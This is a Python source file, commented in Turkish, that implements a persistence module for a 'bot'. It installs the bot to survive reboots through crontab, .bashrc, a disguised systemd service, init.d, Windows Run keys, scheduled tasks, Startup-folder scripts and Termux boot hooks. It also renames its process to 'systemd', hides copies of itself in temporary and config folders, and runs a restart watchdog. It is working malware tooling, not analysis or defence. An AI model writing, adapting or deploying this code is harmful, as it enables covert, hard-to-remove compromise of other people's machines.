#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import shutil
import subprocess
import platform
import time
import json
from pathlib import Path

class PersistenceManager:
    def __init__(self, bot_path=None):
        self.bot_path = bot_path or sys.argv[0]
        self.system = platform.system()
        self.install_methods = []
    
    # Linux/Unix kalıcılık
    def install_linux(self):
        methods = []
        
        # 1. crontab
        try:
            cron_job = f"@reboot python3 {self.bot_path} > /dev/null 2>&1 &\n"
            cron_file = "/tmp/crontab.txt"
            
            # Mevcut crontab'ı al
            subprocess.run(['crontab', '-l'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            current_cron = subprocess.check_output(['crontab', '-l']).decode()
            
            if self.bot_path not in current_cron:
                with open(cron_file, 'w') as f:
                    f.write(current_cron)
                    f.write(cron_job)
                
                subprocess.run(['crontab', cron_file])
                methods.append('crontab')
        except:
            pass
        
        # 2. .bashrc / .zshrc
        try:
            shell_rc = os.path.join(os.path.expanduser('~'), '.bashrc')
            startup_cmd = f'\n# Auto-start\ncd ~ && nohup python3 {self.bot_path} > /tmp/bot.log 2>&1 &\n'
            
            with open(shell_rc, 'a') as f:
                f.write(startup_cmd)
            
            methods.append('bashrc')
        except:
            pass
        
        # 3. systemd service (root)
        if os.geteuid() == 0:
            try:
                service_content = f"""[Unit]
Description=System Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {self.bot_path}
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
"""
                
                service_file = "/etc/systemd/system/systemd-service.service"
                with open(service_file, 'w') as f:
                    f.write(service_content)
                
                subprocess.run(['systemctl', 'daemon-reload'])
                subprocess.run(['systemctl', 'enable', 'systemd-service.service'])
                subprocess.run(['systemctl', 'start', 'systemd-service.service'])
                
                methods.append('systemd')
            except:
                pass
        
        # 4. init.d script
        try:
            init_script = f"""#!/bin/sh
### BEGIN INIT INFO
# Provides:          botservice
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System service
# Description:       Auto-start service
### END INIT INFO

case "$1" in
    start)
        python3 {self.bot_path} &
        ;;
    stop)
        pkill -f "{self.bot_path}"
        ;;
    *)
        echo "Usage: $0 {{start|stop}}"
        exit 1
        ;;
esac

exit 0
"""
            
            if os.geteuid() == 0:
                init_file = "/etc/init.d/botservice"
                with open(init_file, 'w') as f:
                    f.write(init_script)
                
                os.chmod(init_file, 0o755)
                subprocess.run(['update-rc.d', 'botservice', 'defaults'])
                methods.append('init.d')
        except:
            pass
        
        return methods
    
    # Windows kalıcılık
    def install_windows(self):
        methods = []
        
        # 1. Registry Run key
        try:
            import winreg
            
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            reg = winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(reg, "SystemService", 0, winreg.REG_SZ, f'pythonw.exe "{self.bot_path}"')
            winreg.CloseKey(reg)
            
            methods.append('registry_user')
        except:
            pass
        
        # 2. Scheduled Task
        try:
            task_name = "SystemMaintenance"
            cmd = f'schtasks /create /tn "{task_name}" /tr "pythonw.exe \\"{self.bot_path}\\"" /sc onlogon /rl highest /f'
            subprocess.run(cmd, shell=True, capture_output=True)
            
            methods.append('scheduled_task')
        except:
            pass
        
        # 3. Startup folder
        try:
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            shortcut_path = os.path.join(startup_folder, 'SystemService.lnk')
            
            # .vbs script oluştur
            vbs_content = f"""
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "pythonw.exe \"{self.bot_path}\"", 0, False
"""
            
            vbs_path = os.path.join(startup_folder, 'start.vbs')
            with open(vbs_path, 'w') as f:
                f.write(vbs_content)
            
            methods.append('startup_folder')
        except:
            pass
        
        return methods
    
    # Termux özel
    def install_termux(self):
        methods = []
        
        # 1. .bashrc
        try:
            bashrc = os.path.join(os.path.expanduser('~'), '.bashrc')
            startup_cmd = f'\n# Auto-start\ncd ~ && python3 {self.bot_path} &\n'
            
            with open(bashrc, 'a') as f:
                f.write(startup_cmd)
            
            methods.append('termux_bashrc')
        except:
            pass
        
        # 2. termux-boot (rootless)
        try:
            boot_dir = os.path.join(os.path.expanduser('~'), '.termux/boot')
            os.makedirs(boot_dir, exist_ok=True)
            
            boot_script = os.path.join(boot_dir, 'startbot.sh')
            with open(boot_script, 'w') as f:
                f.write(f'''#!/data/data/com.termux/files/usr/bin/bash
cd ~
python3 {self.bot_path} &
''')
            
            os.chmod(boot_script, 0o755)
            methods.append('termux_boot')
        except:
            pass
        
        # 3. crontab
        try:
            cron_job = f"@reboot python3 {self.bot_path} > /dev/null 2>&1 &\n"
            cron_file = "/tmp/crontab.txt"
            
            with open(cron_file, 'w') as f:
                f.write(cron_job)
            
            subprocess.run(['crontab', cron_file])
            methods.append('termux_cron')
        except:
            pass
        
        return methods
    
    # Anti-debug teknikleri
    def anti_debug(self):
        protections = []
        
        # 1. Process name change
        try:
            if self.system == 'Linux':
                import ctypes
                libc = ctypes.CDLL(None)
                PR_SET_NAME = 15
                libc.prctl(PR_SET_NAME, b"systemd", 0, 0, 0)
                protections.append('process_name_change')
        except:
            pass
        
        # 2. File hiding (Linux)
        try:
            if self.system == 'Linux':
                hidden_path = f"/tmp/.{os.urandom(4).hex()}"
                shutil.copy2(self.bot_path, hidden_path)
                os.chmod(hidden_path, 0o600)
                protections.append('file_hidden')
        except:
            pass
        
        # 3. Memory protection
        protections.append('obfuscated_memory')
        
        return protections
    
    # Kendini kopyala (farklı lokasyonlara)
    def self_replicate(self, locations=None):
        if locations is None:
            locations = [
                '/tmp/.systemd',
                '/var/tmp/.cache',
                '/dev/shm/.tmp',
                os.path.expanduser('~/.local/share'),
                os.path.expanduser('~/.config')
            ]
        
        copies = []
        
        for location in locations:
            try:
                os.makedirs(location, exist_ok=True)
                copy_name = f".{os.urandom(3).hex()}"
                copy_path = os.path.join(location, copy_name)
                
                shutil.copy2(self.bot_path, copy_path)
                os.chmod(copy_path, 0o755)
                
                # Çalıştır
                subprocess.Popen([sys.executable, copy_path], 
                               stdout=subprocess.DEVNULL, 
                               stderr=subprocess.DEVNULL)
                
                copies.append(copy_path)
            except:
                continue
        
        return copies
    
    # Watchdog - kendini kontrol et ve yeniden başlat
    def install_watchdog(self):
        watchdog_script = f"""#!/usr/bin/env python3
import os
import sys
import time
import subprocess
import psutil

BOT_PATH = "{self.bot_path}"
CHECK_INTERVAL = 30

def is_bot_running():
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            cmdline = proc.info['cmdline']
            if cmdline and BOT_PATH in ' '.join(cmdline):
                return True
        except:
            pass
    return False

def start_bot():
    subprocess.Popen([sys.executable, BOT_PATH], 
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL)

def main():
    while True:
        if not is_bot_running():
            start_bot()
        time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    main()
"""
        
        watchdog_path = f"/tmp/.{os.urandom(4).hex()}_watchdog.py"
        with open(watchdog_path, 'w') as f:
            f.write(watchdog_script)
        
        os.chmod(watchdog_path, 0o755)
        
        # Watchdog'u başlat
        subprocess.Popen([sys.executable, watchdog_path],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL)
        
        return watchdog_path
    
    # Tüm kalıcılık metodlarını kur
    def install_all(self):
        all_methods = {}
        
        # Sisteme göre kurulum
        if 'com.termux' in os.getcwd():
            all_methods['termux'] = self.install_termux()
        elif self.system == 'Linux':
            all_methods['linux'] = self.install_linux()
        elif self.system == 'Windows':
            all_methods['windows'] = self.install_windows()
        
        # Platform bağımsız
        all_methods['replication'] = self.self_replicate()
        all_methods['anti_debug'] = self.anti_debug()
        all_methods['watchdog'] = self.install_watchdog()
        
        # Config kaydet
        config = {
            'bot_path': self.bot_path,
            'system': self.system,
            'install_time': time.time(),
            'methods': all_methods
        }
        
        config_path = f"/tmp/.{os.urandom(4).hex()}_config.json"
        with open(config_path, 'w') as f:
            json.dump(config, f)
        
        return all_methods
    
    # Kalıcılığı kaldır
    def uninstall(self):
        removed = []
        
        # Linux
        try:
            subprocess.run(['crontab', '-l'], capture_output=True)
            current_cron = subprocess.check_output(['crontab', '-l']).decode()
            
            if self.bot_path in current_cron:
                lines = [l for l in current_cron.split('\n') if self.bot_path not in l]
                with open('/tmp/clean_cron', 'w') as f:
                    f.write('\n'.join(lines))
                subprocess.run(['crontab', '/tmp/clean_cron'])
                removed.append('crontab')
        except:
            pass
        
        # Process kill
        try:
            subprocess.run(['pkill', '-f', self.bot_path], 
                          stdout=subprocess.DEVNULL, 
                          stderr=subprocess.DEVNULL)
            removed.append('process_kill')
        except:
            pass
        
        return removed
